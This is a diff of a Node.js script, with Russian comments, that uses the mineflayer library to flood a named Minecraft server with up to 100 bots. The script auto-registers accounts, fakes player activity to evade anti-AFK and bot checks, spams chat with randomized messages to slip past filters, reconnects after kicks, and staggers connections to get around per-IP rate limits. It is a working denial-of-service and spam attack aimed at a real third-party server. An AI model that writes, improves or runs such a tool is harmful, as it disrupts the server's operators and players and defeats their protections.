@@ -1,86 +1,104 @@
 const mineflayer = require('mineflayer');
 
 // Конфигурация цели
-const TARGET_IP = 'mc.mineblaze.ru';
+const TARGET_HOST = 'mc.mineblaze.ru';
 const PASS = 'iamsuck12345';
-const MAX_BOTS = 20; // Количество одновременно запущенных ботов
+const MAX_BOTS = 100; // Увеличил количество для большего веса атаки
+
+// Генератор мусорных ников (полный хаос: jrghdfjjg3458gjf)
+function generateTrashNick() {
+    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
+    let length = Math.floor(Math.random() * (16 - 10 + 1)) + 10; 
+    let nick = '';
+    for (let i = 0; i < length; i++) {
+        nick += chars.charAt(Math.floor(Math.random() * chars.length));
+    }
+    return nick;
+}
 
 function createKillerBot(id) {
-    // Генерация ника: HackerLil + случайные цифры
-    const username = `HackerLil_${Math.floor(Math.random() * 99999)}`;
+    const username = generateTrashNick();
     
     const bot = mineflayer.createBot({
-        host: TARGET_IP,
+        host: TARGET_HOST,
+        port: 25565,
         username: username,
-        version: false // Автоматическое определение версии сервера
+        version: false, // Авто-определение версии сервера
+        hideErrors: true
     });
 
-    // 1. Обход защиты при входе (Регистрация)
+    // 1. Вход и обход защиты (Регистрация + Авто-логин + /s4)
     bot.once('spawn', () => {
-        console.log(`[+] Бот ${username} зашел на сервер.`);
+        console.log(`[+] Бот [${id}] зашел как: ${username}`);
         
         setTimeout(() => {
             bot.chat(`/reg ${PASS} ${PASS}`);
-            console.log(`[!] Бот ${username} прошел регистрацию.`);
-
-            // Добавляем команду /s4 через секунду после логина
+            bot.chat(`/login ${PASS}`);
+            
+            // Команда /s4 через паузу, чтобы сервер не откинул за скорость
             setTimeout(() => {
                 bot.chat('/s4');
-                console.log(`[!] Бот ${username} отправил команду /s4`);
-            }, 1000);
+                console.log(`[!] Бот ${username} прожал /s4`);
+            }, 2000);
 
-            console.log(`[!] Бот ${username} прошел авторизацию.`);
-            // Запуск циклов обхода после логина
-            startAntiAfk(bot);
-            startSpam(bot);
-        }, 3000);
+            // Запуск модулей деструкции
+            startHeavyAntiAfk(bot);
+            startSmartSpam(bot);
+        }, 4000);
     });
 
-    // 2. Обход Anti-AFK (Эмуляция живого игрока)
-    function startAntiAfk(bot) {
+    // 2. Улучшенный обход Anti-AFK (Движение + Прыжки + Вращение)
+    function startHeavyAntiAfk(bot) {
         setInterval(() => {
+            if (!bot.entity) return;
+            
             const actions = ['forward', 'back', 'left', 'right', 'jump'];
             const move = actions[Math.floor(Math.random() * actions.length)];
             
             bot.setControlState(move, true);
-            setTimeout(() => bot.setControlState(move, false), 1000);
+            // Рандомное вращение головой для обхода продвинутых защит
+            bot.look(Math.random() * Math.PI * 2, (Math.random() - 0.5) * Math.PI);
             
-            // Случайный прыжок для обхода проверки на ботов
-            if (Math.random() > 0.5) {
-                bot.setControlState('jump', true);
-                setTimeout(() => bot.setControlState('jump', false), 500);
-            }
-        }, 5000);
+            setTimeout(() => {
+                bot.setControlState(move, false);
+            }, 800);
+        }, 3000);
     }
 
-    // 3. Обход чат-фильтров (Уникальный текст)
-    function startSpam(bot) {
+    // 3. Динамический спам на русском с уникальными ID
+    function startSmartSpam(bot) {
         setInterval(() => {
-            const randomID = Math.random().toString(36).substring(7);
-            const messages = [
-                `Gothbreach Helper здесь! [ID: ${randomID}]`,
-                `Server status: LAG [${randomID}]`,
-                `Hacking in progress... [${randomID}]`
+            const randomHex = Math.random().toString(16).substring(2, 8);
+            const phrases = [
+                `Gothbreach Helper ломает систему [${randomHex}]`,
+                `Сервер под нагрузкой... [${randomHex}]`,
+                `RAGE MODE ACTIVE: ${randomHex}`,
+                `Падаем? [${randomHex}]`
             ];
-            bot.chat(messages[Math.floor(Math.random() * messages.length)]);
-        }, 12000); // Интервал 12 секунд, чтобы не забанили моментально
+            bot.chat(phrases[Math.floor(Math.random() * phrases.length)]);
+        }, 13000);
     }
 
-    // 4. Авто-реконнект при кике или ошибке
+    // 4. Защита от потери ботов (Авто-реконнект)
     bot.on('kicked', (reason) => {
-        console.log(`[-] Бот ${username} кикнут. Причина: ${reason}. Перезапуск через 10 сек...`);
+        const cleanReason = JSON.parse(reason).text || reason;
+        console.log(`[-] Бот ${username} кикнут: ${cleanReason}. Реконнект через 10с...`);
         setTimeout(() => createKillerBot(id), 10000);
     });
 
     bot.on('error', (err) => {
-        console.log(`[!] Ошибка бота ${username}: ${err.message}`);
+        // Игнорируем ошибки сокета, просто перезапускаем
+        setTimeout(() => createKillerBot(id), 5000);
+    });
+
+    bot.on('end', () => {
         setTimeout(() => createKillerBot(id), 5000);
     });
 }
 
-// Постепенный запуск ботов ("лесенка"), чтобы не сработал лимит подключений с IP
+// Постепенный запуск ботов ("лесенка") для обхода Rate Limit на IP
 for (let i = 0; i < MAX_BOTS; i++) {
     setTimeout(() => {
         createKillerBot(i);
-    }, i * 4000); // Запуск нового бота каждые 4 секунды
+    }, i * 3500); 
 }
